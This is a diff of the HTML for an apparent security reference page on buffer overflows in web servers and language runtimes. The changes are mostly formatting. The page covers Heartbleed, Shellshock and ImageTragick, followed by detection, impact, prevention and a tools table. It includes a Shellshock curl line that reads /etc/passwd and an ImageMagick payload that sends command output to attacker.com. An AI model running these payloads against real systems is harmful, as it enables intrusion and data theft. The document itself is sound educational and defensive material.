 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff\xff</span><span style="color:#e6db74">&#34;</span>       <span style="color:#75715e"># Payload Length: 65535 (actual payload: 0 bytes)</span>
 </span></span><span style="display:flex;"><span>)
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Server reads 65535 bytes from heap and echoes them back</span>
-</span></span></code></pre></div><p><strong>Lesson:</strong> A single missing bounds check on an attacker-controlled length field in a C parsing function exposed the private keys of ~17% of the internet&rsquo;s HTTPS servers.</p>
-<h3 id="2-shellshock--environment-variable-buffer-confusion-in-bash-cgi-cve-2014-6271">
-  2. Shellshock — Environment Variable Buffer Confusion in Bash CGI (CVE-2014-6271)
-  <a class="anchor" href="#2-shellshock--environment-variable-buffer-confusion-in-bash-cgi-cve-2014-6271">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Server reads 65535 bytes from heap and echoes them back</span></span></span></code></pre></div><p><strong>Lesson:</strong> A single missing bounds check on an attacker-controlled length field in a C parsing function exposed the private keys of ~17% of the internet&rsquo;s HTTPS servers.</p>
+<h3 id="2-shellshock--environment-variable-buffer-confusion-in-bash-cgi-cve-2014-6271">2. Shellshock — Environment Variable Buffer Confusion in Bash CGI (CVE-2014-6271)<a class="anchor" href="#2-shellshock--environment-variable-buffer-confusion-in-bash-cgi-cve-2014-6271">#</a></h3>
 <p>Bash parsed function definitions in environment variables and continued executing code after the function body — allowing arbitrary command execution via HTTP headers passed to CGI scripts.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># HTTP Header → Environment Variable → Bash execution</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># HTTP Header → Environment Variable → Bash execution</span>
 </span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#39;User-Agent: () { :; }; /bin/cat /etc/passwd&#39;</span> http://target.com/cgi-bin/status.cgi
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Bash processes the function definition, then executes /bin/cat /etc/passwd</span>
-</span></span></code></pre></div><p><strong>Web relevance:</strong> Any HTTP header (User-Agent, Referer, Cookie, custom headers) becomes an environment variable in CGI — all are attacker-controlled injection points.</p>
-<h3 id="3-imagemagick-imagetragick--shell-injection-via-malformed-image-cve-2016-3714">
-  3. ImageMagick &ldquo;ImageTragick&rdquo; — Shell Injection via Malformed Image (CVE-2016-3714)
-  <a class="anchor" href="#3-imagemagick-imagetragick--shell-injection-via-malformed-image-cve-2016-3714">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Bash processes the function definition, then executes /bin/cat /etc/passwd</span></span></span></code></pre></div><p><strong>Web relevance:</strong> Any HTTP header (User-Agent, Referer, Cookie, custom headers) becomes an environment variable in CGI — all are attacker-controlled injection points.</p>
+<h3 id="3-imagemagick-imagetragick--shell-injection-via-malformed-image-cve-2016-3714">3. ImageMagick &ldquo;ImageTragick&rdquo; — Shell Injection via Malformed Image (CVE-2016-3714)<a class="anchor" href="#3-imagemagick-imagetragick--shell-injection-via-malformed-image-cve-2016-3714">#</a></h3>
 <p>ImageMagick&rsquo;s policy files failed to restrict certain coders. A malformed image with an <code>https://</code> delegate URL triggered shell metacharacter expansion.</p>
 <pre tabindex="0"><code># Malicious MVG file uploaded as &#34;image.jpg&#34;
 push graphic-context
 viewbox 0 0 640 480
 fill &#39;url(https://127.0.0.1/image.jpg&#34;|curl http://attacker.com/`id`&#34;)&#39;
-pop graphic-context
-</code></pre><p><strong>Web context:</strong> Any endpoint accepting image uploads and passing them to ImageMagick (thumbnailing, resizing) is vulnerable — regardless of the web framework used.</p>
-<h3 id="4-http2-hpack-header-decompression-overflow">
-  4. HTTP/2 HPACK Header Decompression Overflow
-  <a class="anchor" href="#4-http2-hpack-header-decompression-overflow">#</a>
-</h3>
+pop graphic-context</code></pre><p><strong>Web context:</strong> Any endpoint accepting image uploads and passing them to ImageMagick (thumbnailing, resizing) is vulnerable — regardless of the web framework used.</p>
+<h3 id="4-http2-hpack-header-decompression-overflow">4. HTTP/2 HPACK Header Decompression Overflow<a class="anchor" href="#4-http2-hpack-header-decompression-overflow">#</a></h3>
 <p>HTTP/2 uses HPACK compression for headers. Malformed Huffman-encoded header blocks or oversized dynamic table entries can overflow internal parsing buffers in C-based HTTP/2 implementations (nghttp2, h2o).</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Craft oversized HPACK dynamic table entry</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Craft oversized HPACK dynamic table entry</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Send header with extremely large value to overflow dynamic table</span>
 </span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> [(<span style="color:#e6db74">&#39;:method&#39;</span>, <span style="color:#e6db74">&#39;GET&#39;</span>), (<span style="color:#e6db74">&#39;:path&#39;</span>, <span style="color:#e6db74">&#39;/&#39;</span>), (<span style="color:#e6db74">&#39;x-overflow&#39;</span>, <span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">65535</span>)]
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># In vulnerable implementations, dynamic table update overflows heap buffer</span>
-</span></span></code></pre></div><h2 id="framework-specific-scenarios">
-  Framework-Specific Scenarios
-  <a class="anchor" href="#framework-specific-scenarios">#</a>
-</h2>
-<h3 id="php--native-extension-overflows">
-  PHP — Native Extension Overflows
-  <a class="anchor" href="#php--native-extension-overflows">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># In vulnerable implementations, dynamic table update overflows heap buffer</span></span></span></code></pre></div><h2 id="framework-specific-scenarios">Framework-Specific Scenarios<a class="anchor" href="#framework-specific-scenarios">#</a></h2>
+<h3 id="php--native-extension-overflows">PHP — Native Extension Overflows<a class="anchor" href="#php--native-extension-overflows">#</a></h3>
 <p>PHP&rsquo;s C extensions (GD, exif, zip, mbstring) process user-supplied files/strings in native code. Overflows in these extensions are reachable from PHP code without any unsafe PHP itself.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">// Triggers exif extension buffer overflow (CVE-2019-11042)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$exif <span style="color:#f92672">=</span> <span style="color:#a6e22e">exif_read_data</span>($_FILES[<span style="color:#e6db74">&#39;upload&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>]);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">// Triggers exif extension buffer overflow (CVE-2019-11042)
+</span></span></span><span style="display:flex;"><span>$exif <span style="color:#f92672">=</span> <span style="color:#a6e22e">exif_read_data</span>($_FILES[<span style="color:#e6db74">&#39;upload&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>]);
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// A crafted JPEG with a malformed IFD entry overflows a heap buffer in ext/exif
 </span></span></span></code></pre></div><p><strong>Key CVEs:</strong> CVE-2019-11042 (exif), CVE-2018-17082 (Apache2 PHP), CVE-2020-7059 (mbstring).</p>
-<h3 id="nodejs--native-addon--buffer-misuse">
-  Node.js — Native Addon &amp; Buffer Misuse
-  <a class="anchor" href="#nodejs--native-addon--buffer-misuse">#</a>
-</h3>
+<h3 id="nodejs--native-addon--buffer-misuse">Node.js — Native Addon &amp; Buffer Misuse<a class="anchor" href="#nodejs--native-addon--buffer-misuse">#</a></h3>
 <p>Node.js <code>Buffer</code> objects bypass V8&rsquo;s garbage collector. Misuse of <code>Buffer.allocUnsafe()</code> or vulnerable native addons can expose uninitialized memory or cause overflows.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Unsafe: exposes uninitialized heap memory
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">buf</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">allocUnsafe</span>(<span style="color:#ae81ff">1024</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Unsafe: exposes uninitialized heap memory
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">buf</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">allocUnsafe</span>(<span style="color:#ae81ff">1024</span>);
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// If echoed back to user before being filled, leaks heap content (analogous to Heartbleed)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// Vulnerable native addon call
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">native</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;./native_module&#39;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">native</span>.<span style="color:#a6e22e">processInput</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>); <span style="color:#75715e">// C++ addon with no bounds check on input length
-</span></span></span></code></pre></div><p><strong>Attack vector:</strong> Oversized JSON body or binary WebSocket frame routed to a native addon.</p>
-<h3 id="python--c-extensions--ctypes">
-  Python — C Extensions / ctypes
-  <a class="anchor" href="#python--c-extensions--ctypes">#</a>
-</h3>
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">native</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;./native_module&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">native</span>.<span style="color:#a6e22e">processInput</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>); <span style="color:#960050;background-color:#1e0010">// C++ addon with no bounds check on input length</span></span></span></code></pre></div><p><strong>Attack vector:</strong> Oversized JSON body or binary WebSocket frame routed to a native addon.</p>
+<h3 id="python--c-extensions--ctypes">Python — C Extensions / ctypes<a class="anchor" href="#python--c-extensions--ctypes">#</a></h3>
 <p>Python&rsquo;s safety guarantees don&rsquo;t extend to C extensions or <code>ctypes</code> calls.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> ctypes
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> ctypes
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Loading a vulnerable shared library and passing user input</span>
 </span></span><span style="display:flex;"><span>lib <span style="color:#f92672">=</span> ctypes<span style="color:#f92672">.</span>CDLL(<span style="color:#e6db74">&#34;./libparser.so&#34;</span>)
@@ -1571,39 +1485,27 @@ pop graphic-context
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># PIL/Pillow: image processing overflows in libtiff, libwebp</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
-</span></span><span style="display:flex;"><span>img <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(uploaded_file)  <span style="color:#75715e"># Malformed WebP → CVE-2023-4863 (libwebp heap overflow)</span>
-</span></span></code></pre></div><p><strong>Notable:</strong> CVE-2023-4863 (libwebp) affected any Python app using Pillow for WebP processing.</p>
-<h3 id="java--jni-and-native-memory">
-  Java — JNI and Native Memory
-  <a class="anchor" href="#java--jni-and-native-memory">#</a>
-</h3>
+</span></span><span style="display:flex;"><span>img <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(uploaded_file)  <span style="color:#75715e"># Malformed WebP → CVE-2023-4863 (libwebp heap overflow)</span></span></span></code></pre></div><p><strong>Notable:</strong> CVE-2023-4863 (libwebp) affected any Python app using Pillow for WebP processing.</p>
+<h3 id="java--jni-and-native-memory">Java — JNI and Native Memory<a class="anchor" href="#java--jni-and-native-memory">#</a></h3>
 <p>Java&rsquo;s JVM doesn&rsquo;t overflow managed heap, but JNI calls into native libraries and direct <code>ByteBuffer</code> operations in native code are unprotected.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// JNI call to native XML parser
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">native</span> String <span style="color:#a6e22e">parseXml</span><span style="color:#f92672">(</span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> data<span style="color:#f92672">);</span>  <span style="color:#75715e">// libexpat underneath
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// If data contains a malformed entity expansion → heap overflow in libexpat (CVE-2022-25313)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// Unsafe direct buffer — off-heap (C malloc); overflow bypasses JVM protections
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>ByteBuffer buf <span style="color:#f92672">=</span> ByteBuffer<span style="color:#f92672">.</span><span style="color:#a6e22e">allocateDirect</span><span style="color:#f92672">(</span><span style="color:#ae81ff">1024</span><span style="color:#f92672">);</span>
-</span></span></code></pre></div><h3 id="go--unsafe-package--cgo">
-  Go — Unsafe Package &amp; CGo
-  <a class="anchor" href="#go--unsafe-package--cgo">#</a>
-</h3>
-<p>Go&rsquo;s type system prevents buffer overflows in pure Go — but <code>unsafe.Pointer</code> and CGo remove those guarantees.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;unsafe&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// JNI call to native XML parser</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">native</span> String <span style="color:#a6e22e">parseXml</span>(<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> data);  <span style="color:#75715e">// libexpat underneath</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// If data contains a malformed entity expansion → heap overflow in libexpat (CVE-2022-25313)</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// Unsafe pointer arithmetic — can read/write beyond intended bounds
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">ptr</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">unsafe</span>.<span style="color:#a6e22e">Pointer</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">slice</span>[<span style="color:#ae81ff">0</span>])
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// Advance beyond slice bounds → reads adjacent heap memory
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// CGo calling vulnerable C library
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// #include &#34;libparser.h&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;C&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Unsafe direct buffer — off-heap (C malloc); overflow bypasses JVM protections</span>
+</span></span><span style="display:flex;"><span>ByteBuffer buf <span style="color:#f92672">=</span> ByteBuffer.<span style="color:#a6e22e">allocateDirect</span>(1024);</span></span></code></pre></div><h3 id="go--unsafe-package--cgo">Go — Unsafe Package &amp; CGo<a class="anchor" href="#go--unsafe-package--cgo">#</a></h3>
+<p>Go&rsquo;s type system prevents buffer overflows in pure Go — but <code>unsafe.Pointer</code> and CGo remove those guarantees.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;unsafe&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Unsafe pointer arithmetic — can read/write beyond intended bounds</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ptr</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">unsafe</span>.<span style="color:#a6e22e">Pointer</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">slice</span>[<span style="color:#ae81ff">0</span>])
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Advance beyond slice bounds → reads adjacent heap memory</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// CGo calling vulnerable C library</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// #include &#34;libparser.h&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;C&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">C</span>.<span style="color:#a6e22e">parse</span>((<span style="color:#f92672">*</span><span style="color:#a6e22e">C</span>.<span style="color:#a6e22e">char</span>)(<span style="color:#a6e22e">unsafe</span>.<span style="color:#a6e22e">Pointer</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">input</span>[<span style="color:#ae81ff">0</span>])), <span style="color:#a6e22e">C</span>.int(len(<span style="color:#a6e22e">input</span>)))
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// No bounds check in C code → overflow
-</span></span></span></code></pre></div><h3 id="nginx--apache--module-level-overflows">
-  Nginx / Apache — Module-Level Overflows
-  <a class="anchor" href="#nginx--apache--module-level-overflows">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// No bounds check in C code → overflow</span></span></span></code></pre></div><h3 id="nginx--apache--module-level-overflows">Nginx / Apache — Module-Level Overflows<a class="anchor" href="#nginx--apache--module-level-overflows">#</a></h3>
 <p>Web servers themselves have historically suffered buffer overflows in core modules.</p>
 <pre tabindex="0"><code># Apache mod_rewrite heap overflow (CVE-2017-9798 - Optionsbleed)
 OPTIONS * HTTP/1.1
@@ -1612,15 +1514,8 @@ Host: target.com
 
 # Nginx mp4 module stack overflow (CVE-2022-41741)
 GET /video.mp4?start=&lt;crafted_float&gt; HTTP/1.1
-# Malformed mp4 atom triggers stack overflow in ngx_http_mp4_module
-</code></pre><h2 id="detection-techniques">
-  Detection Techniques
-  <a class="anchor" href="#detection-techniques">#</a>
-</h2>
-<h3 id="manual-detection">
-  Manual Detection
-  <a class="anchor" href="#manual-detection">#</a>
-</h3>
+# Malformed mp4 atom triggers stack overflow in ngx_http_mp4_module</code></pre><h2 id="detection-techniques">Detection Techniques<a class="anchor" href="#detection-techniques">#</a></h2>
+<h3 id="manual-detection">Manual Detection<a class="anchor" href="#manual-detection">#</a></h3>
 <ul>
 <li><strong>Fuzzing HTTP Inputs:</strong> Send progressively longer values (powers of 2: 128, 256, 512 &hellip; 65536 bytes) in every HTTP parameter — headers, cookies, path segments, body fields — and monitor for crashes or anomalous responses.</li>
 <li><strong>Memory Leak Probing:</strong> Send requests with attacker-controlled length fields (Content-Length, chunk sizes, HPACK table sizes) set to values far exceeding the actual body; inspect responses for leaked memory bytes.</li>
@@ -1628,19 +1523,14 @@ GET /video.mp4?start=&lt;crafted_float&gt; HTTP/1.1
 <li><strong>File Upload Fuzzing:</strong> Submit malformed files (truncated headers, oversized metadata fields, recursive structures) targeting server-side parsers.</li>
 <li><strong>Differential Analysis:</strong> Compare responses to normal vs. oversized inputs for timing differences, partial responses, or connection resets — signs of a crash/restart.</li>
 </ul>
-<h3 id="automated-detection">
-  Automated Detection
-  <a class="anchor" href="#automated-detection">#</a>
-</h3>
+<h3 id="automated-detection">Automated Detection<a class="anchor" href="#automated-detection">#</a></h3>
 <ul>
 <li>
 <p><strong>AFL++ / libFuzzer:</strong> Industry-standard coverage-guided fuzzers for C/C++ server components and parsing libraries.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>afl-fuzz -i inputs/ -o findings/ -- ./webserver_parser @@
-</span></span></code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>afl-fuzz -i inputs/ -o findings/ -- ./webserver_parser @@</span></span></code></pre></div></li>
 <li>
 <p><strong>Boofuzz:</strong> Python network fuzzing framework designed for protocol fuzzing over HTTP, WebSocket, and custom TCP.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> boofuzz <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>session <span style="color:#f92672">=</span> Session(target<span style="color:#f92672">=</span>Target(connection<span style="color:#f92672">=</span>TCPSocketConnection(<span style="color:#e6db74">&#34;target.com&#34;</span>, <span style="color:#ae81ff">80</span>)))
-</span></span></code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> boofuzz <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>session <span style="color:#f92672">=</span> Session(target<span style="color:#f92672">=</span>Target(connection<span style="color:#f92672">=</span>TCPSocketConnection(<span style="color:#e6db74">&#34;target.com&#34;</span>, <span style="color:#ae81ff">80</span>)))</span></span></code></pre></div></li>
 <li>
 <p><strong>OWASP ZAP Buffer Overflow Scanner:</strong> Active scan rule that tests for overflows via oversized input injection across all detected parameters.</p>
 </li>
@@ -1649,16 +1539,12 @@ GET /video.mp4?start=&lt;crafted_float&gt; HTTP/1.1
 </li>
 <li>
 <p><strong>Valgrind / AddressSanitizer (ASAN):</strong> Instrument the server binary in a test environment to detect out-of-bounds reads/writes at runtime.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Build with ASANgcc -fsanitize=address -o server server.c# Run and exercise the endpoint — ASAN reports exact overflow location</span>
-</span></span></code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Build with ASANgcc -fsanitize=address -o server server.c# Run and exercise the endpoint — ASAN reports exact overflow location</span></span></span></code></pre></div></li>
 <li>
 <p><strong>GDB + PEDA/pwndbg:</strong> Dynamic analysis of server processes; set watchpoints on buffer boundaries and trace execution during fuzzing.</p>
 </li>
 </ul>
-<h2 id="impact">
-  Impact
-  <a class="anchor" href="#impact">#</a>
-</h2>
+<h2 id="impact">Impact<a class="anchor" href="#impact">#</a></h2>
 <ul>
 <li><strong>Remote Code Execution (RCE):</strong> The most severe outcome — an attacker gains arbitrary code execution on the server with the privileges of the web server process.</li>
 <li><strong>Denial of Service (DoS):</strong> Crashing the web server or worker process, causing service outage — often easier to achieve than full exploitation.</li>
@@ -1668,10 +1554,7 @@ GET /video.mp4?start=&lt;crafted_float&gt; HTTP/1.1
 <li><strong>Supply Chain Impact:</strong> Overflows in widely used parsing libraries (libwebp, libpng, OpenSSL) affect every application linking against them — impact is multiplied across thousands of deployments.</li>
 <li><strong>Compliance &amp; Legal Exposure:</strong> Memory disclosure of PII or payment data constitutes a notifiable breach under GDPR, PCI-DSS, and HIPAA.</li>
 </ul>
-<h2 id="prevention-techniques">
-  Prevention Techniques
-  <a class="anchor" href="#prevention-techniques">#</a>
-</h2>
+<h2 id="prevention-techniques">Prevention Techniques<a class="anchor" href="#prevention-techniques">#</a></h2>
 <ul>
 <li><strong>Use Memory-Safe Languages Where Possible:</strong> Rewrite performance-critical web components in Rust or Go instead of C/C++. For extensions, prefer managed-language equivalents over native addons.</li>
 <li><strong>Enable Compiler Protections:</strong> Build all native components with <code>fstack-protector-strong</code> (canaries), <code>D_FORTIFY_SOURCE=2</code> (bounds checking on libc calls), and <code>Wformat -Werror=format-security</code> (format string protection).</li>
@@ -1684,108 +1567,96 @@ GET /video.mp4?start=&lt;crafted_float&gt; HTTP/1.1
 <li><strong>Rate Limiting &amp; Request Size Caps:</strong> Enforce maximum request body size, header length, and URI length at the reverse proxy level to prevent resource-exhaustion-based heap manipulation.</li>
 <li><strong>Use Safe String/Memory Functions:</strong> Replace <code>strcpy</code>, <code>sprintf</code>, <code>gets</code> with <code>strncpy</code>, <code>snprintf</code>, <code>fgets</code> and prefer <code>strlcpy</code>/<code>strlcat</code> where available.</li>
 </ul>
-<h2 id="tools">
-  Tools
-  <a class="anchor" href="#tools">#</a>
-</h2>
+<h2 id="tools">Tools<a class="anchor" href="#tools">#</a></h2>
 <table>
-<thead>
-<tr>
-<th>Tool</th>
-<th>Category</th>
-<th>Use Case</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>testssl.sh</code></td>
-<td>Recon</td>
-<td>TLS-layer overflow surface identification (Heartbleed, POODLE)</td>
-</tr>
-<tr>
-<td><code>AFL++</code></td>
-<td>Fuzzing</td>
-<td>Coverage-guided fuzzing of native server components and parsers</td>
-</tr>
-<tr>
-<td><code>libFuzzer</code></td>
-<td>Fuzzing</td>
-<td>In-process fuzzing for C/C++ libraries (integrate with ASAN)</td>
-</tr>
-<tr>
-<td><code>Boofuzz</code></td>
-<td>Fuzzing</td>
-<td>Network-level HTTP/WebSocket protocol fuzzing</td>
-</tr>
-<tr>
-<td><code>Burp Suite</code></td>
-<td>Web Proxy</td>
-<td>Manual overflow probing via Intruder; response analysis</td>
-</tr>
-<tr>
-<td><code>OWASP ZAP</code></td>
-<td>Scanner</td>
-<td>Automated buffer overflow active scan across HTTP parameters</td>
-</tr>
-<tr>
-<td><code>GDB + pwndbg</code></td>
-<td>Debugger</td>
-<td>Dynamic analysis; crash triage; ROP chain development</td>
-</tr>
-<tr>
-<td><code>ROPgadget</code></td>
-<td>Exploit Dev</td>
-<td>ROP gadget discovery in server binaries and libraries</td>
-</tr>
-<tr>
-<td><code>Pwntools</code></td>
-<td>Exploit Dev</td>
-<td>Python exploit scripting framework for binary exploitation</td>
-</tr>
-<tr>
-<td><code>Valgrind</code></td>
-<td>Memory Analysis</td>
-<td>Runtime memory error detection (out-of-bounds, use-after-free)</td>
-</tr>
-<tr>
-<td><code>AddressSanitizer (ASAN)</code></td>
-<td>Memory Analysis</td>
-<td>Compile-time instrumentation for precise overflow detection</td>
-</tr>
-<tr>
-<td><code>checksec</code></td>
-<td>Recon</td>
-<td>Enumerate binary protections (NX, ASLR, canary, PIE, RELRO)</td>
-</tr>
-<tr>
-<td><code>Nmap NSE</code></td>
-<td>Recon</td>
-<td><code>http-shellshock</code>, <code>ssl-heartbleed</code> scripts for known CVE detection</td>
-</tr>
-<tr>
-<td><code>Metasploit</code></td>
-<td>Exploitation</td>
-<td>Modules for Heartbleed, Shellshock, and historical web server CVEs</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Tool</th>
+					<th>Category</th>
+					<th>Use Case</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><code>testssl.sh</code></td>
